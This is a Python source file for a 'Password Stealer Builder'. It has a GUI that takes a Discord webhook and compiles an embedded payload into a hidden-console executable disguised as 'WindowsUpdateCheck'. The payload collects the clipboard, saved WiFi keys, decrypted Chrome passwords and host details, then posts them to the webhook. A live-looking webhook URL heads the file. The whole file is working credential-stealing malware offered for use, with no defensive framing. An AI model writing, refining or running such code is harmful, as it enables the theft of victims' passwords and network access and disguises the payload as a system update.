https://discord.com/api/webhooks/1420479039973490803/wAOLMbEAm-TVcAI61OSBb7YXzq-lzJzf4sPwde8XHjnuoQtiaMeN3Kwr29OI7AEqp4yO


import os
import sys
import subprocess
import tkinter as tk
from tkinter import messagebox, ttk
import shutil
import tempfile
import textwrap
import requests

# =================== WEBHOOK TEST ===================
def test_webhook(hook):
    try:
        resp = requests.post(hook, json={"content": "Stealer debug test - webhook alive ðŸ”¥"}, timeout=10)
        if resp.status_code in [200, 204]:
            return True, "Webhook working - test message sent."
        else:
            return False, f"Failed ({resp.status_code})"
    except Exception as e:
        return False, f"Error: {str(e)}"

# =================== GUI ===================
def get_webhook():
    root = tk.Tk()
    root.title("Password Stealer Builder - Silent & Debugged")
    root.geometry("600x350")
    root.resizable(False, False)
    
    tk.Label(root, text="Discord Webhook URL:", font=("Arial", 11)).pack(pady=15)
    webhook_entry = tk.Entry(root, width=80)
    webhook_entry.pack(pady=5)
    
    def run_test():
        hook = webhook_entry.get().strip()
        success, msg = test_webhook(hook)
        if success:
            messagebox.showinfo("OK", msg)
        else:
            messagebox.showerror("Failed", msg)
    
    tk.Button(root, text="TEST WEBHOOK", command=run_test, bg="#5865F2", fg="white", font=("Arial", 10, "bold")).pack(pady=10)
    
    progress = ttk.Progressbar(root, mode="indeterminate")
    
    def build():
        webhook = webhook_entry.get().strip()
        if not webhook or "discord.com/api/webhooks" not in webhook:
            messagebox.showerror("Nope", "Valid Discord webhook required.")
            return
        
        progress.pack(pady=15)
        progress.start()
        root.update()
        
        try:
            generate_malware(webhook)
            progress.stop()
            progress.pack_forget()
            messagebox.showinfo("Built", 
                "stealer.exe ready!\n\n"
                "Fixed silent crash (pywin32 bundling).\n"
                "Now logs debug to %TEMP%\\stealer_debug.log if anything fails.\n"
                "Grabs Chrome passwords (weak ones highlighted), WiFi, clipboard, recon.\n"
                "Sends JSON file + fallback text.")
        except Exception as e:
            progress.stop()
            progress.pack_forget()
            messagebox.showerror("Error", f"Build failed:\n{str(e)}")
        root.destroy()
    
    tk.Button(root, text="BUILD EXE", command=build, bg="green", fg="white", font=("Arial", 14, "bold"), height=2).pack(pady=20)
    root.mainloop()

# =================== STEALER PAYLOAD WITH DEBUG LOGGING ===================
stealer_code = textwrap.dedent('''
import os
import json
import sqlite3
import shutil
import subprocess
import requests
import getpass
import platform
import socket
from datetime import datetime
import ctypes
import sys

# Debug logging - writes to temp so you can see crashes
DEBUG_LOG = os.path.join(os.getenv("TEMP"), "stealer_debug.log")
def log(msg):
    try:
        with open(DEBUG_LOG, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now()}] {msg}\\n")
    except:
        pass

log("Stealer started")

try:
    import win32crypt
    log("win32crypt imported OK")
except Exception as e:
    log(f"win32crypt import FAILED: {str(e)}")
    win32crypt = None

WEBHOOK = "{WEBHOOK_PLACEHOLDER}"

def gather_data():
    data = {}
    user = getpass.getuser()
    data['user'] = user
    data['hostname'] = socket.gethostname()
    data['os'] = platform.platform()
    data['time'] = datetime.now().isoformat()
    log("Basic recon collected")

    # Clipboard
    try:
        CF_TEXT = 1
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32
        user32.OpenClipboard(0)
        if user32.IsClipboardFormatAvailable(CF_TEXT):
            handle = user32.GetClipboardData(CF_TEXT)
            clipboard_data = ctypes.c_char_p(handle).value.decode('utf-8', errors='ignore')
            data['clipboard'] = clipboard_data
        user32.CloseClipboard()
        log("Clipboard grabbed")
    except Exception as e:
        data['clipboard'] = "failed"
        log(f"Clipboard failed: {str(e)}")

    # WiFi passwords
    data['wifi'] = []
    try:
        profiles_output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], text=True, encoding='utf-8', errors='ignore')
        profile_names = [line.split(":")[1].strip() for line in profiles_output.split('\\n') if "All User Profile" in line]
        for profile in profile_names:
            try:
                key_output = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], text=True, encoding='utf-8', errors='ignore')
                key_line = [line.split(":")[1].strip() for line in key_output.split('\\n') if "Key Content" in line]
                if key_line:
                    data['wifi'].append({profile: key_line[0]})
            except:
                pass
        log(f"WiFi grabbed: {len(data['wifi'])} networks")
    except Exception as e:
        data['wifi'] = ["failed"]
        log(f"WiFi failed: {str(e)}")

    # Chrome passwords
    data['chrome_passwords'] = []
    if win32crypt:
        login_db = f"C:\\\\Users\\\\{user}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data"
        if os.path.exists(login_db):
            try:
                temp_db = os.path.join(os.getenv("TEMP"), "LoginTemp")
                shutil.copy2(login_db, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    url = row[0]
                    username = row[1]
                    encrypted_pw = row[2]
                    try:
                        decrypted = win32crypt.CryptUnprotectData(encrypted_pw, None, None, None, 0)[1].decode('utf-8')
                        if any(weak in decrypted.lower() for weak in ["possword", "p@ssw0rd", "password", "admin", "1234", "qwerty", "letmein"]):
                            data['chrome_passwords'].append({"url": url, "user": username, "pass": decrypted})
                    except Exception as e:
                        log(f"Decrypt failed on one entry: {str(e)}")
                conn.close()
                os.remove(temp_db)
                log(f"Chrome grabbed: {len(data['chrome_passwords'])} weak passwords")
            except Exception as e:
                data['chrome_passwords'] = [f"failed: {str(e)}"]
                log(f"Chrome overall failed: {str(e)}")
        else:
            data['chrome_passwords'] = ["no chrome db"]
            log("No Chrome Login Data found")
    else:
        data['chrome_passwords'] = ["win32crypt unavailable"]
        log("Chrome skipped due to import fail")

    return data

def exfil():
    try:
        payload_json = json.dumps(gather_data(), indent=2)
        temp_file = os.path.join(os.getenv("TEMP"), "report.json")
        with open(temp_file, "w", encoding="utf-8") as f:
            f.write(payload_json)
        
        with open(temp_file, "rb") as f:
            files = {"file": ("grab.json", f)}
            content = {"content": f"**Password Grab** - {getpass.getuser()}@{socket.gethostname()}"}
            requests.post(WEBHOOK, data=content, files=files, timeout=30)
        log("Exfil success (file)")
    except Exception as e:
        log(f"Primary exfil failed: {str(e)}")
        try:
            requests.post(WEBHOOK, json={"content": f"**Fallback Grab**\\n```json\\n{payload_json}\\n```"})
            log("Fallback exfil success")
        except Exception as e2:
            log(f"Fallback also failed: {str(e2)}")
    finally:
        try:
            os.remove(temp_file)
        except:
            pass

exfil()
log("Run complete - check webhook")

while True:
    import time
    time.sleep(3600)
''')

# =================== BUILD WITH MAX PYWIN32 HOOKS ===================
def generate_malware(webhook):
    temp_dir = tempfile.mkdtemp(prefix="build_")
    script_path = os.path.join(temp_dir, "stealer.py")
    
    with open(script_path, "w", encoding="utf-8") as f:
        f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", webhook))
    
    cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--name", "WindowsUpdateCheck",
        "--hidden-import", "win32crypt",
        "--hidden-import", "pywintypes",
        "--hidden-import", "pythoncom",
        "--hidden-import", "ctypes",
        "--collect-all", "win32crypt",
        "--collect-all", "pywin32",
        "--collect-submodules", "win32ctypes",
        script_path
    ]
    
    result = subprocess.run(cmd, cwd=temp_dir, capture_output=True, text=True)
    if result.returncode != 0:
        raise Exception(f"PyInstaller failed hard:\\nSTDERR:\\n{result.stderr}\\n\\nSTDOUT:\\n{result.stdout}")
    
    built_exe = os.path.join(temp_dir, "dist", "WindowsUpdateCheck.exe")
    final_exe = os.path.join(os.getcwd(), "stealer.exe")
    shutil.copyfile(built_exe, final_exe)
    shutil.rmtree(temp_dir, ignore_errors=True)
    print(f"Bulletproof stealer built: {final_exe}")

if __name__ == "__main__":
    get_webhook()
